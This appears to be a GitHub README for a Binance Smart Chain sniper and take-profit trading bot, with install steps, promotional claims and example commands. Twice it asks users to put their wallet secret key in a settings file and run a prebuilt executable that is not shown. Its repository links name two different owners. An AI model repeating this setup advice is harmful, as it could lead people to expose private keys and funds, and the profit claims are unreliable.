# 🚀 BSC Pancakeswap, BiSwap & Mdex Sniper Bot 🚀
[![Python Version](https://img.shields.io/badge/Python-3.8%2B-blue)](https://www.python.org/downloads/) [![Release](https://img.shields.io/badge/Release-V4-brightgreen)](https://github.com/Sevens-W3-Lab/Pancakeswap_BSC_Sniper_Bot/releases/tag/V4) [![Build Status](https://img.shields.io/badge/Build-Passing-brightgreen)]()



### Web3 Pancakeswap, BiSwap & Mdex Sniper && Take Profit/StopLose bot written in python3, for V2 and V3 from Uniswap.
Please note the license conditions!
<br />

# Changelog: Version 3 to Version 4

**New Feature: Pancakeswap V3 Support**
- The bot now includes support for Pancakeswap V3 pools.

**Improvements:**
- Various performance enhancements and bug fixes to ensure smoother execution.
- Updated algorithms for better analysis of multiple exchange routes.



## The first Binance Smart Chain sniper bot with Honeypot checker!  
<a href="https://github.com/Sevens-W3-Lab/Pancakeswap_BSC_Sniper_Bot/releases" >

  
### Setup your Address and secret key in Settings.json and Run main-GUI.exe.

# Install
First of all, you need install Python3+
Run on Android you need Install [Termux](https://termux.com/) only from F-Droid works atm. 
```shell
termux: 
$ pkg install python git cmake 
Debian/Ubuntu: 
$ sudo apt install python3 git cmake gcc
Windows:
You Need to install Visual Studio BuildTools & Python3
```

### Setup your Address and secret key in Settings.json.

Clone Repo:  
```shell
git clone https://github.com/Trading-Tiger/Pancakeswap_BSC_Sniper_Bot
cd Pancakeswap_BSC_Sniper_Bot
```

Install Requirements:  
```python
python -m pip install -r requirements.txt
```  


## Maximize Your Profits with Our Token Launch Solution
Our sniper bot is specifically designed to help you quickly purchase tokens during high-demand events such as token launches and swap enablement. With its lightning-fast speed, the bot is capable of executing trades in a matter of seconds, giving you a competitive edge in securing a significant portion of the new tokens.
This powerful tool is designed to buy and sell with BNB to ensure you always get the best return on investment. 

## Multi Hops for Optimal Results 
The tool uses advanced algorithms to analyze multiple exchange routes to find the most efficient path for your swap. 

## Low Tax Rates 
There's a 0.7% tax on the swap amount, but if you hold 1k TIGS, your tax rate drops to an incredibly low 0.2%. This means you can keep more of your profits. 

## Enjoy a Seamless Swapping Experience 
With this tool, you can effortlessly swap your assets for BNB and take advantage of the many benefits it offers. So why wait? Start maximizing your returns today!  

<br />
<br />

# Documentations
- ## [Installation](https://docs.trading-tigers.com/sniper-bot/installation)
<br />
  

## Start Sniper:  
```python
python Sniper.py -t <TOKEN_ADDRESS> -a <AMOUNT> -tx <TXAMOUNT> -hp -wb <BLOCKS WAIT BEFORE BUY> -tp <TAKE PROFIT IN PERCENT> -sl <STOP LOSE IN PERCENT>
python Sniper.py -t 0x34faa80fec0233e045ed4737cc152a71e490e2e3 -a 0.001 -tx 2 -hp  -wb 10 -tp 50
python Sniper.py -t 0x34faa80fec0233e045ed4737cc152a71e490e2e3 --sellonly
python Sniper.py -t 0x34faa80fec0233e045ed4737cc152a71e490e2e3 -a 0.001 --buyonly
python Sniper.py -t 0x34faa80fec0233e045ed4737cc152a71e490e2e3 -tsl 10 -tp 10 -sl 10 -nb
```
